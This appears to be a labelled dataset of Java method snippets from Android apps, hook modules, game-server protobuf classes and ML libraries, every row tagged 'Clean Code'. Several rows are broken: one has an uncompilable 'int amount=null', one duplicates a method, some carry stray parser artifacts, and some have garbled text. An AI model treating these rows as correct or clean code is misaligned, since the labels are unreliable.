    mSession.write(String.format(""\033[<%d;%d;%d"" + (pressed ? 'M' : 'm'),mouseButton,column,row));
  }
 else {
    mouseButton=pressed ? mouseButton : 3;
    boolean out_of_bounds=column > 255 - 32 || row > 255 - 32;
    if (!out_of_bounds) {
      byte[] data={'\033','[','M',(byte)(32 + mouseButton),(byte)(32 + column),(byte)(32 + row)};
      mSession.write(data,0,data.length);
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 MMFONFFPNJM = 8;</code>
 * @return this
 */
public RogueMiracleDataInfo clearMMFONFFPNJM(){
  bitField0_&=~0x00000002;
  mMFONFFPNJM=0;
  return this;
}",0,Clean Code
"public String getXmlContent(){
  return this.xmlContent;
}
",0,Clean Code
"@Override public void onTearDown(){
  if (isTornDown()) {
    return;
  }
  if (mPlaceholderListener != null) {
    mPlaceholderListener.invalidate();
  }
  if (mMainListener != null) {
    mMainListener.invalidate();
  }
  super.onTearDown();
  if (mNativeQuad != null) {
    mNativeQuad.dispose();
    mNativeQuad=null;
  }
  if (mDefaultMaterial != null) {
    mDefaultMaterial.dispose();
    mDefaultMaterial=null;
  }
  if (mLatestImage != null) {
    mLatestImage.destroy();
    mLatestImage=null;
  }
  if (mLatestImageTexture != null) {
    mLatestImageTexture.dispose();
    mLatestImageTexture=null;
  }
}
",0,Clean Code
"public static void extractRootfs(Context context,boolean romExist,boolean needsUpgrade,boolean forceInstall,boolean use3rdRom){
  removeSystemPartition(context);
  removeVendorPartition(context);
  if (!romExist) {
    extractRootfsInAssets(context);
    return;
  }
  if (forceInstall) {
    if (use3rdRom) {
      boolean success=extract3rdRootfs(context);
      if (!success) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
 else {
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
    AppKV.setBooleanConfig(context,AppKV.FORCE_ROM_BE_RE_INSTALL,false);
  }
 else {
    if (use3rdRom) {
      Log.w(TAG,""WTF? 3rd ROM must be force install!"");
    }
    if (needsUpgrade) {
      Log.i(TAG,""upgrade factory rom.."");
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
      }
    }
  }
}
public static int extractRootfs(Context context,File rootfs7z){
  int cpu=Runtime.getRuntime().availableProcessors();
  return P7ZipApi.executeCommand(String.format(Locale.US,""7z x -mmt=%d -aoa '%s' '-o%s'"",cpu,rootfs7z,context.getDataDir()));
}",0,Clean Code
"public Float getRepetitionPenalty(){
  return repetitionPenalty;
}
",0,Clean Code
"public String getEventName(){
  return bundle.getString(""EVENT_NAME"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4ec7bd88",0,Clean Code
"void changedY(CBend bend,double y);
",0,Clean Code
"private static void home(){
  String s=AntStallRpcCall.home();
  try {
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (!jo.getBoolean(""hasRegister"") || jo.getBoolean(""hasQuit"")) {
        Log.farm(""铓傝殎鏂版潙鉀鍏堝紑鍚殏铓佹柊鏉�"");
        return;
      }
      JSONObject astReceivableCoinVO=jo.getJSONObject(""astReceivableCoinVO"");
      if (astReceivableCoinVO.optBoolean(""hasCoin"")) {
        settleReceivable();
      }
      if (Config.stallThrowManure()) {
        throwManure();
      }
      JSONObject seatsMap=jo.getJSONObject(""seatsMap"");
      settle(seatsMap);
      collectManure();
      sendBack(seatsMap);
      if (Config.stallAutoClose()) {
        closeShop();
      }
      if (Config.stallAutoOpen()) {
        openShop();
      }
      taskList();
      achieveBeShareP2P();
      if (Config.stallDonate()) {
        roadmap();
      }
    }
 else {
      Log.recordLog(""home err:"",s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""home err:"");
    Log.printStackTrace(TAG,t);
  }
}",0,Clean Code
"/** 
 * Returns an array of the property names on the given script object.
 */
private Object[] getObjectIdsImpl(Context cx,Object object){
  if (!(object instanceof Scriptable) || object == Undefined.instance) {
    return Context.emptyArgs;
  }
  Object[] ids;
  Scriptable scriptable=(Scriptable)object;
  if (scriptable instanceof DebuggableObject) {
    ids=((DebuggableObject)scriptable).getAllIds();
  }
 else {
    ids=scriptable.getIds();
  }
  Scriptable proto=scriptable.getPrototype();
  Scriptable parent=scriptable.getParentScope();
  int extra=0;
  if (proto != null) {
    ++extra;
  }
  if (parent != null) {
    ++extra;
  }
  if (extra != 0) {
    Object[] tmp=new Object[extra + ids.length];
    System.arraycopy(ids,0,tmp,extra,ids.length);
    ids=tmp;
    extra=0;
    if (proto != null) {
      ids[extra++]=""__proto__"";
    }
    if (parent != null) {
      ids[extra++]=""__parent__"";
    }
  }
  return ids;
}",0,Clean Code
"@Override public void removedBend(final CViewEdge<?> edge,final int index,final CBend bend){
  bend.removeListener(m_listener);
  if (m_realizer.bendCount() == m_rawEdge.getBendCount()) {
    return;
  }
  m_realizer.removeBend(m_realizer.getBend(index));
}
@Override public void removedBend(final ZyEdgeRealizer<EdgeTypeT> realizer,final int position){
  m_rawEdge.removeBend(position);
}
",0,Clean Code
"private KNNModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KNNModelProto(){
  vectors_=java.util.Collections.emptyList();
  outputs_=java.util.Collections.emptyList();
  parallelBackend_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@496819a6",0,Clean Code
"public void roll(ItemParamMap drops){
  if (this.chance < 1000) {
    int random=Utils.randomRange(0,999);
    if (random > this.chance) {
      return;
    }
  }
  var count=BigDecimal.valueOf(generateCount());
  var rates=LunarCore.getConfig().getServerRates();
  while (count.doubleValue() > 0) {
    int itemId=generateItemId();
    ItemExcel excel=GameData.getItemExcelMap().get(itemId);
    if (excel == null)     break;
    if (excel.isEquippable()) {
      if (rates.getEquip() > 0) {
        drops.addTo(itemId,1);
        count=count.subtract(BigDecimal.valueOf(1.0 / rates.getEquip()));
      }
 else {
        count=count.subtract(BigDecimal.ONE);
      }
    }
 else {
      int amount=null;
      if (amount > 0) {
        drops.addTo(itemId,amount);
      }
      count=BigDecimal.ZERO;
    }
  }
}",0,Clean Code
"@Override public SetFriendMarkScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  uid=0;
  retcode=0;
  isSetMark=false;
  return this;
}",0,Clean Code
"@TruffleBoundary private UnmodifiableEconomicSet<Object> collectAllRegularPropertyNames(){
  if (EconomicMaps.isEmpty(declaredProperties)) {
    return superclass == null ? EconomicSet.create() : superclass.getAllRegularPropertyNames();
  }
  var size=superclass == null ? 0 : superclass.getAllRegularPropertyNames().size();
  var result=EconomicSet.create(size);
  for (  var property : EconomicMaps.getValues(declaredProperties)) {
    if (!(property.isLocal() || isHiddenProperty(property.getName()) || property.isExternal())) {
      result.add(property.getName());
    }
  }
  if (superclass == null) {
    return result;
  }
  if (result.isEmpty()) {
    return superclass.getAllRegularPropertyNames();
  }
  result.addAll(superclass.getAllRegularPropertyNames());
  return result;
}",0,Clean Code
"/** 
 * Returns the set of permissions corresponding to a given  {@code String}representation. <p> The  {@code perms} parameter is a {@code String} representing thepermissions. It has 9 characters that are interpreted as three sets of three. The first set refers to the owner's permissions; the next to the group permissions and the last to others. Within each set, the first character is  {@code 'r'} to indicate permission to read, the secondcharacter is  {@code 'w'} to indicate permission to write, and the thirdcharacter is  {@code 'x'} for execute permission. Where a permission isnot set then the corresponding character is set to  {@code '-'}. <p> <b>Usage Example:</b> Suppose we require the set of permissions that indicate the owner has read, write, and execute permissions, the group has read and execute permissions and others have none. <pre> Set&lt;FilePermission&gt; perms = FilePermissions.fromString(""rwxr-x---""); </pre>
 * @param perms string representing a set of permissions
 * @return  the resulting set of permissions
 * @throws IllegalArgumentException if the string cannot be converted to a set of permissions
 * @see #toString(Set)
 */
public static Set<FilePermission> fromString(String perms){
  if (perms.length() != 9)   throw new IllegalArgumentException(""Invalid mode"");
  Set<FilePermission> result=EnumSet.noneOf(FilePermission.class);
  if (isR(perms.charAt(0)))   result.add(OWNER_READ);
  if (isW(perms.charAt(1)))   result.add(OWNER_WRITE);
  if (isX(perms.charAt(2)))   result.add(OWNER_EXECUTE);
  if (isR(perms.charAt(3)))   result.add(GROUP_READ);
  if (isW(perms.charAt(4)))   result.add(GROUP_WRITE);
  if (isX(perms.charAt(5)))   result.add(GROUP_EXECUTE);
  if (isR(perms.charAt(6)))   result.add(OTHERS_READ);
  if (isW(perms.charAt(7)))   result.add(OTHERS_WRITE);
  if (isX(perms.charAt(8)))   result.add(OTHERS_EXECUTE);
  return result;
}",0,Clean Code
"/** 
 * <code>optional uint32 relic_unique_id = 10;</code>
 * @return the relicUniqueId
 */
public int getRelicUniqueId(){
  return relicUniqueId;
}",0,Clean Code
"private List<? extends KeyReference> createKey(Object[] keys){
  boolean[] reclaimedFlags=new boolean[keys.length];
  if (GraalvmSupport.isGraalBuildtime()) {
    List<NoCallbackRef> keyRefs=new ArrayList<>();
    for (    Object key : keys) {
      keyRefs.add(new NoCallbackRef(key));
    }
    return keyRefs;
  }
  List<FinalizableKeyReference> keyRefs=new ArrayList<>();
  for (int i=0; i < keys.length; i++) {
    keyRefs.add(new FinalizableKeyReference(keys[i],keyRefs,reclaimedFlags,i));
  }
  return keyRefs;
}",0,Clean Code
"@Override public void mouseReleased(final MouseEvent event){
  if (event.isPopupTrigger()) {
    showPopupMenu(event);
  }
}
",0,Clean Code
"private EvaluatorBuilder(){
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(equipAvatarId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.equipmentUniqueId,equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.baseAvatarId,baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.equipAvatarId,equipAvatarId);
  }
  output.endObject();
}",0,Clean Code
"public ZhipuChatHeaderAuthorizationInterceptor(String key,String secret){
  this.key=key;
  this.secret=secret;
}
",0,Clean Code
"@Override public void handleLoadPackage(){
  initHook(UseThirdPartyBrowser.INSTANCE,mPrefsMap.getBoolean(""content_extension_browser""));
  initHook(new DisableChatWatermark(),mPrefsMap.getBoolean(""voiceassist_disable_watermark""));
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaInfoScRsp}
 */
public static GetGachaInfoScRsp newInstance(){
  return new GetGachaInfoScRsp();
}
",0,Clean Code
"private void openItem(CacheModel.FileInfo fileInfo,CacheCell cacheCell){
  RecyclerListView recyclerListView=(RecyclerListView)viewPagerFixed.getCurrentView();
  if (cacheCell.type == TYPE_DOCUMENTS) {
    if (!(recyclerListView.getAdapter() instanceof DocumentsAdapter)) {
      return;
    }
    DocumentsAdapter documentsAdapter=(DocumentsAdapter)recyclerListView.getAdapter();
    PhotoViewer.getInstance().setParentActivity(parentFragment);
    if (placeProvider == null) {
      placeProvider=new BasePlaceProvider();
    }
    placeProvider.setRecyclerListView(recyclerListView);
    if (fileIsMedia(fileInfo.file)) {
      ArrayList<Object> photoEntries=new ArrayList<>();
      photoEntries.add(new MediaController.PhotoEntry(0,0,0,fileInfo.file.getPath(),0,fileInfo.type == TYPE_VIDEOS,0,0,0));
      ;
      PhotoViewer.getInstance().openPhotoForSelect(photoEntries,0,PhotoViewer.SELECT_TYPE_NO_SELECT,false,placeProvider,null);
    }
 else {
      AndroidUtilities.openForView(fileInfo.file,fileInfo.file.getName(),null,parentFragment.getParentActivity(),null);
    }
  }
  if (cacheCell.type == TYPE_MUSIC) {
    if (MediaController.getInstance().isPlayingMessage(fileInfo.messageObject)) {
      if (!MediaController.getInstance().isMessagePaused()) {
        MediaController.getInstance().pauseMessage(fileInfo.messageObject);
      }
 else {
        MediaController.getInstance().playMessage(fileInfo.messageObject);
      }
    }
 else {
      MediaController.getInstance().playMessage(fileInfo.messageObject);
    }
  }
  return;
}",0,Clean Code
"@Override public boolean onCustomLayout(View view,int left,int top,int right,int bottom){
  int width=(right - left);
  int height=(bottom - top);
  boolean isPortrait=width < height;
  if (view == cameraPanel) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126 + 96),width,bottom - AndroidUtilities.dp(96));
      }
 else {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126),width,bottom);
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(right - AndroidUtilities.dp(126 + 96),0,right - AndroidUtilities.dp(96),height);
      }
 else {
        cameraPanel.layout(right - AndroidUtilities.dp(126),0,right,height);
      }
    }
    return true;
  }
 else   if (view == zoomControlView) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 96 + 38+ 50),width,bottom - AndroidUtilities.dp(126 + 96 + 38));
      }
 else {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 50),width,bottom - AndroidUtilities.dp(126));
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 96 + 38+ 50),0,right - AndroidUtilities.dp(126 + 96 + 38),height);
      }
 else {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 50),0,right - AndroidUtilities.dp(126),height);
      }
    }
    return true;
  }
 else   if (view == counterTextView) {
    int cx;
    int cy;
    if (isPortrait) {
      cx=(width - counterTextView.getMeasuredWidth()) / 2;
      cy=bottom - AndroidUtilities.dp(113 + 16 + 38);
      counterTextView.setRotation(0);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cy-=AndroidUtilities.dp(96);
      }
    }
 else {
      cx=right - AndroidUtilities.dp(113 + 16 + 38);
      cy=height / 2 + counterTextView.getMeasuredWidth() / 2;
      counterTextView.setRotation(-90);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cx-=AndroidUtilities.dp(96);
      }
    }
    counterTextView.layout(cx,cy,cx + counterTextView.getMeasuredWidth(),cy + counterTextView.getMeasuredHeight());
    return true;
  }
 else   if (view == cameraPhotoRecyclerView) {
    if (isPortrait) {
      int cy=height - AndroidUtilities.dp(88);
      view.layout(0,cy,view.getMeasuredWidth(),cy + view.getMeasuredHeight());
    }
 else {
      int cx=left + width - AndroidUtilities.dp(88);
      view.layout(cx,0,cx + view.getMeasuredWidth(),view.getMeasuredHeight());
    }
    return true;
  }
  return false;
}",0,Clean Code
"@Override public void doubleClicked(){
}
",0,Clean Code
"@NonNull public static String describeIntent(@NonNull Intent intent,String prefix){
  String action=intent.getAction();
  String data=intent.getDataString();
  String type=intent.getType();
  Set<String> categories=intent.getCategories();
  ComponentName cn=intent.getComponent();
  String packageName=intent.getPackage();
  int flags=intent.getFlags();
  Bundle extras=intent.getExtras();
  StringBuilder sb=new StringBuilder();
  if (action != null)   sb.append(prefix).append("" ACTION\t"").append(action).append(""\n"");
  if (data != null)   sb.append(prefix).append("" DATA\t"").append(data).append(""\n"");
  if (type != null)   sb.append(prefix).append("" TYPE\t"").append(type).append(""\n"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    String id=intent.getIdentifier();
    if (id != null)     sb.append(prefix).append("" IDENTIFIER\t"").append(id).append(""\n"");
  }
  if (categories != null) {
    for (    String category : categories) {
      sb.append(prefix).append("" CATEGORY\t"").append(category).append(""\n"");
    }
  }
  if (cn != null)   sb.append(prefix).append("" COMPONENT\t"").append(cn.flattenToString()).append(""\n"");
  if (packageName != null)   sb.append(prefix).append("" PACKAGE\t"").append(packageName).append(""\n"");
  if (flags != 0)   sb.append(prefix).append("" FLAGS\t0x"").append(Integer.toHexString(flags)).append(""\n"");
  if (extras != null) {
    for (    String key : extras.keySet()) {
      Pair<Integer,String> typeAndString=valueToParsableStringAndType(extras.get(key));
      if (typeAndString != null) {
        sb.append(prefix).append("" EXTRA\t"").append(key).append(""\t"").append(typeAndString.first);
        if (typeAndString.first != TYPE_NULL) {
          sb.append(""\t"").append(typeAndString.second);
        }
        sb.append(""\n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * <code>optional uint32 cur_chat_bubble = 10;</code>
 * @return this
 */
public SelectChatBubbleScRsp clearCurChatBubble(){
  bitField0_&=~0x00000002;
  curChatBubble=0;
  return this;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockMultiOutputInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockMultiOutputInfoProto other=(org.tribuo.test.protos.MockMultiOutputInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountsList().equals(other.getCountsList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getLabelCounter() != other.getLabelCounter())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
",0,Clean Code
"void initializedComment(IFunction function,List<CommentType> comment);
",0,Clean Code
"private static String getAppPath(){
  try {
    String jarPath=System.getProperty(""project.path"");
    return FileUtil.getParent(jarPath,4);
  }
 catch (  Exception e) {
    log.error(""getAppPath error"",e);
    return null;
  }
}",0,Clean Code
"void accept(int node,float score);
",0,Clean Code
"@Override public Color getBorderColor(){
  return new Color(m_borderColor.getRGB());
}
",0,Clean Code
"@Override public Optional<Resource> getResource(ResourceLocation id){
  final String path=id.getPath();
  if (path.endsWith(""json"")) {
    return Optional.of(new StringResource(id,json));
  }
 else   if (path.endsWith(""vsh"")) {
    return Optional.of(new StringResource(id,vertex));
  }
 else   if (path.endsWith(""gsh"")) {
    if (geometry == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,geometry));
  }
 else   if (path.endsWith(""tcs"")) {
    if (tessControl == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessControl));
  }
 else   if (path.endsWith(""tes"")) {
    if (tessEval == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessEval));
  }
 else   if (path.endsWith(""fsh"")) {
    return Optional.of(new StringResource(id,fragment));
  }
  return Optional.empty();
}
",0,Clean Code
"private CRFParametersProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CRFParametersProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4b0cc719",0,Clean Code
"public void onDetachedFromWindow(){
  if (!attachedToWindow) {
    return;
  }
  attachedToWindow=false;
  if (currentImageLocation != null || currentMediaLocation != null || currentThumbLocation != null || staticThumbDrawable != null) {
    if (setImageBackup == null) {
      setImageBackup=new SetImageBackup();
    }
    setImageBackup.mediaLocation=currentMediaLocation;
    setImageBackup.mediaFilter=currentMediaFilter;
    setImageBackup.imageLocation=currentImageLocation;
    setImageBackup.imageFilter=currentImageFilter;
    setImageBackup.thumbLocation=currentThumbLocation;
    setImageBackup.thumbFilter=currentThumbFilter;
    setImageBackup.thumb=staticThumbDrawable;
    setImageBackup.size=currentSize;
    setImageBackup.ext=currentExt;
    setImageBackup.cacheType=currentCacheType;
    setImageBackup.parentObject=currentParentObject;
  }
  if (!ignoreNotifications) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.didReplacedPhotoInMemCache);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.stopAllHeavyOperations);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.startAllHeavyOperations);
  }
  if (staticThumbDrawable instanceof AttachableDrawable) {
    ((AttachableDrawable)staticThumbDrawable).onDetachedFromWindow(this);
  }
  if (staticThumbDrawable != null) {
    setStaticDrawable(null);
    thumbShader=null;
    roundPaint.setShader(null);
  }
  clearImage();
  if (isPressed == 0) {
    pressedProgress=0f;
  }
  AnimatedFileDrawable animatedFileDrawable=getAnimation();
  if (animatedFileDrawable != null) {
    animatedFileDrawable.removeParent(this);
  }
  RLottieDrawable lottieDrawable=getLottieAnimation();
  if (lottieDrawable != null) {
    lottieDrawable.removeParentView(this);
  }
}",0,Clean Code
"private static BiomeCategories getBiomeCategory(Holder<Biome> holder){
  if (holder.is(BiomeTags.WITHOUT_WANDERING_TRADER_SPAWNS)) {
    return BiomeCategories.NONE;
  }
 else   if (holder.is(BiomeTags.HAS_VILLAGE_SNOWY)) {
    return BiomeCategories.ICY;
  }
 else   if (holder.is(BiomeTags.IS_HILL)) {
    return BiomeCategories.EXTREME_HILLS;
  }
 else   if (holder.is(BiomeTags.IS_TAIGA)) {
    return BiomeCategories.TAIGA;
  }
 else   if (holder.is(BiomeTags.IS_OCEAN)) {
    return BiomeCategories.OCEAN;
  }
 else   if (holder.is(BiomeTags.IS_JUNGLE)) {
    return BiomeCategories.JUNGLE;
  }
 else   if (holder.is(BiomeTags.IS_FOREST)) {
    return BiomeCategories.FOREST;
  }
 else   if (holder.is(BiomeTags.IS_BADLANDS)) {
    return BiomeCategories.MESA;
  }
 else   if (holder.is(BiomeTags.IS_NETHER)) {
    return BiomeCategories.NETHER;
  }
 else   if (holder.is(BiomeTags.IS_END)) {
    return BiomeCategories.THE_END;
  }
 else   if (holder.is(BiomeTags.IS_BEACH)) {
    return BiomeCategories.BEACH;
  }
 else   if (holder.is(BiomeTags.HAS_DESERT_PYRAMID)) {
    return BiomeCategories.DESERT;
  }
 else   if (holder.is(BiomeTags.IS_RIVER)) {
    return BiomeCategories.RIVER;
  }
 else   if (holder.is(BiomeTags.HAS_CLOSER_WATER_FOG)) {
    return BiomeCategories.SWAMP;
  }
 else   if (holder.is(BiomeTags.PLAYS_UNDERWATER_MUSIC)) {
    return BiomeCategories.UNDERGROUND;
  }
 else   if (holder.is(BiomeTags.WITHOUT_ZOMBIE_SIEGES)) {
    return BiomeCategories.MUSHROOM;
  }
 else   if (holder.is(BiomeTags.IS_MOUNTAIN)) {
    return BiomeCategories.MOUNTAIN;
  }
 else {
    return BiomeCategories.PLAINS;
  }
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 7;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableBattleInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getBattleInfo(){
  return battleInfo;
}",0,Clean Code
"@Override public long getGuildId(){
  return 0;
}",0,Clean Code
"public Pair<RawFunction,RawFunction> getMatchedFunctionPairAt(final int index){
  return matchedFunctionPairs.get(index);
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.locationPermissionGranted) {
    locationDenied=false;
    askedForLocation=false;
    positionMarker();
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
    if (map != null) {
      try {
        map.setMyLocationEnabled(true);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
 else   if (id == NotificationCenter.locationPermissionDenied) {
    locationDenied=true;
    askedForLocation=false;
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
  }
  fixLayoutInternal(true);
  searchItem.setVisibility(locationDenied && !parentAlert.isStoryLocationPicker || parentAlert.isBizLocationPicker ? View.GONE : View.VISIBLE);
}
",0,Clean Code
"@Override public LeaveRogueScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  rogueInfo.clear();
  lineup.clear();
  scene.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 miracle_id = 3;</code>
 * @param value the miracleId to set
 * @return this
 */
public SelectRogueMiracleCsReq setMiracleId(final int value){
  bitField0_|=0x00000001;
  miracleId=value;
  return this;
}",0,Clean Code
"private Function2Nodes(){
}",0,Clean Code
"private ImmutableLabelInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableLabelInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  count_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@776adf0e",0,Clean Code
"private void writeObject(ObjectOutputStream stream) throws IOException {
  stream.write(data.length);
  stream.write(data);
}
",0,Clean Code
"@Override public TimestampData getTimestamp(int i,int precision){
  if (valueVector instanceof TimeStampSecVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampSecTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecTZVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampMilliVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMilliTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliTZVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMicroVector) {
    long micros=((TimeStampMicroVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampMicroTZVector) {
    long micros=((TimeStampMicroTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampNanoVector) {
    long nanos=((TimeStampNanoVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
 else {
    long nanos=((TimeStampNanoTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
}",0,Clean Code
"/** 
 * 灏嗘湭鐭ョ被鍨嬭浆鎹负鐩爣绫诲瀷
 */
@SneakyThrows public static Object typeStrConvertObject(Object obj,Class<?> targetType){
  String str=obj.toString();
  if (NumberUtils.isCreatable(str)) {
    if (str.endsWith("".0"")) {
      str=str.substring(0,str.length() - 2);
    }
  }
  if (int.class == targetType || Integer.class == targetType) {
    return Integer.valueOf(str);
  }
 else   if (short.class == targetType || Short.class == targetType) {
    return Short.valueOf(str);
  }
 else   if (long.class == targetType || Long.class == targetType) {
    return Long.valueOf(str);
  }
 else   if (float.class == targetType || Float.class == targetType) {
    return Float.valueOf(str);
  }
 else   if (double.class == targetType || Double.class == targetType) {
    return Double.valueOf(str);
  }
 else   if (BigDecimal.class == targetType) {
    return new BigDecimal(str);
  }
 else   if (boolean.class == targetType || Boolean.class == targetType) {
    return Boolean.valueOf(str);
  }
 else   if (targetType.isEnum()) {
    return targetType.getMethod(""valueOf"",String.class).invoke(targetType,str);
  }
 else {
    return str;
  }
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueAvatar}
 */
public static ChessRogueAvatar newInstance(){
  return new ChessRogueAvatar();
}
",0,Clean Code
"/** 
 * <code>optional .BuffInfo add_buff_info = 7;</code>
 * @return whether the addBuffInfo field is set
 */
public boolean hasAddBuffInfo(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"public void setClassLoader(ClassLoader classLoader){
  if (mPrefsMap.getBoolean(""system_ui_plugin_enable_volume_blur""))   EnableVolumeBlur.initEnableVolumeBlur(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_smart_hub_entry"",0) != 0)   HideMiSmartHubEntry.initHideMiSmartHubEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_play_entry"",0) != 0)   HideMiPlayEntry.initHideMiPlayEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_device_ctrl_entry"",0) != 0)   HideDeviceControlEntry.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_cc_bluetooth_tile_style"",1) > 1)   BluetoothTileStyle.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getBoolean(""system_framework_volume_separate_control"") && mPrefsMap.getBoolean(""system_framework_volume_separate_slider""))   NotificationVolumeSeparateSlider.initHideDeviceControlEntry(classLoader);
  if (isMoreHyperOSVersion(1f) && mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect""))   CCGridForHyperOS.initCCGridForHyperOS(classLoader);
  if (mPrefsMap.getBoolean(""system_cc_volume_showpct_title""))   ShowVolumePct.init(classLoader);
  if (mPrefsMap.getBoolean(""system_ui_unlock_super_volume""))   SuperVolume.initSuperVolume(classLoader);
  if ((mPrefsMap.getInt(""system_control_center_cc_rows"",4) > 4 || mPrefsMap.getInt(""system_control_center_cc_columns"",4) > 4 || mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect"") || mPrefsMap.getBoolean(""system_control_center_qs_tile_label"")) && !isMoreHyperOSVersion(1f)) {
    CCGrid.loadCCGrid(classLoader);
  }
  if (mPrefsMap.getBoolean(""system_ui_control_center_qs_open_color"") || mPrefsMap.getBoolean(""system_ui_control_center_qs_big_open_color""))   QSColor.pluginHook(classLoader);
